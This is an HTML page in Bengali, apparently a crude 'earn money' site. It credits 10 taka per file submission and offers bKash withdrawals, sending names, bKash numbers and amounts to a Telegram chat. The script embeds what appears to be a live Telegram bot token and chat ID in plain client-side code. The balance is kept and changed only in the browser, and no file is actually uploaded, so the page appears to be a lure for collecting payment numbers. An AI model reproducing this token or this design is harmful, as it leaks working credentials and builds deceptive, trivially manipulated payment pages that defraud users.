<!DOCTYPE html>
<html lang="bn">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Mini System</title>

<style>
body{
    font-family: Arial;
    background:#0f172a;
    color:white;
    margin:0;
    padding:20px;
}

.container{max-width:650px;margin:auto;}

.card{
    background:#1e293b;
    padding:15px;
    border-radius:10px;
    margin-bottom:15px;
}

input, button{
    width:100%;
    padding:10px;
    margin-top:10px;
    border:none;
    border-radius:5px;
}

button{
    background:#4f46e5;
    color:white;
    cursor:pointer;
}

button:hover{background:#4338ca;}

.balance{
    font-size:20px;
    color:lime;
}

.modal{
    display:none;
    position:fixed;
    top:0;left:0;
    width:100%;height:100%;
    background:rgba(0,0,0,0.6);
    justify-content:center;
    align-items:center;
}

.box{
    background:#1e293b;
    padding:20px;
    border-radius:10px;
    width:300px;
}
</style>
</head>

<body>

<div class="container">

<!-- TOP BUTTONS -->
<div class="card">
    <button onclick="openProfile()">👤 Profile</button>
    <button onclick="openWithdraw()">💸 Withdraw</button>
</div>

<!-- USER -->
<div class="card">
    <h3>👤 User</h3>
    <input type="text" id="username" placeholder="আপনার নাম">
    <p>💰 Balance: <span id="balance" class="balance">0</span> টাকা</p>
</div>

<!-- FILE SUBMIT -->
<div class="card">
    <h3>📁 File Submit</h3>
    <input type="file" id="fileInput">
    <button onclick="uploadFile()">Submit</button>
    <p id="msg"></p>
</div>

</div>

<!-- PROFILE -->
<div id="profileBox" class="modal">
  <div class="box">
    <h3>👤 Profile</h3>
    <p>Name: <span id="pname"></span></p>
    <p>Balance: <span id="pbalance"></span> TK</p>
    <button onclick="closeProfile()">Close</button>
  </div>
</div>

<!-- WITHDRAW -->
<div id="withdrawBox" class="modal">
  <div class="box">
    <h3>💸 bKash Withdraw</h3>

    <input type="text" id="bkash" placeholder="bKash Number">
    <input type="number" id="amount" placeholder="Amount">

    <button onclick="submitWithdraw()">Submit</button>
    <button onclick="closeWithdraw()" style="background:red;">Close</button>

    <p id="wmsg"></p>
  </div>
</div>

<script>

let BOT_TOKEN = "8723327185:AAEhTmE2fuKlcmyOJsmPKm9tUHvnHdOgg88";
let CHAT_ID = "8656416117";

let balance = 0;

// PROFILE
function openProfile(){
    document.getElementById("profileBox").style.display="flex";
    document.getElementById("pname").innerText =
        document.getElementById("username").value || "N/A";
    document.getElementById("pbalance").innerText = balance;
}

function closeProfile(){
    document.getElementById("profileBox").style.display="none";
}

// WITHDRAW
function openWithdraw(){
    document.getElementById("withdrawBox").style.display="flex";
}

function closeWithdraw(){
    document.getElementById("withdrawBox").style.display="none";
}

function submitWithdraw(){
    let bkash = document.getElementById("bkash").value;
    let amount = document.getElementById("amount").value;
    let name = document.getElementById("username").value;

    if(!bkash || !amount){
        document.getElementById("wmsg").innerText="সব তথ্য দিন!";
        return;
    }

    if(amount > balance){
        document.getElementById("wmsg").innerText="❌ পর্যাপ্ত ব্যালেন্স নেই";
        return;
    }

    let msg =
`💸 Withdraw Request
👤 Name: ${name}
📱 bKash: ${bkash}
💰 Amount: ${amount} TK`;

    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
        method:"POST",
        headers:{"Content-Type":"application/json"},
        body:JSON.stringify({
            chat_id: CHAT_ID,
            text: msg
        })
    });

    balance -= amount;
    document.getElementById("balance").innerText = balance;

    document.getElementById("wmsg").innerText="✔ Sent to admin";
}

// FILE SUBMIT → TELEGRAM
function uploadFile(){
    let name = document.getElementById("username").value;
    let file = document.getElementById("fileInput").files[0];

    if(!name || !file){
        document.getElementById("msg").innerText="সব তথ্য দিন!";
        return;
    }

    let reward = 10;
    balance += reward;
    document.getElementById("balance").innerText = balance;

    let msg =
`📁 File Submission
👤 Name: ${name}
📄 File: ${file.name}
💰 Earned: ${reward} TK`;

    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
        method:"POST",
        headers:{"Content-Type":"application/json"},
        body:JSON.stringify({
            chat_id: CHAT_ID,
            text: msg
        })
    });

    document.getElementById("msg").innerText="✔ Sent to Telegram";
}

</script>

</body>
</html>
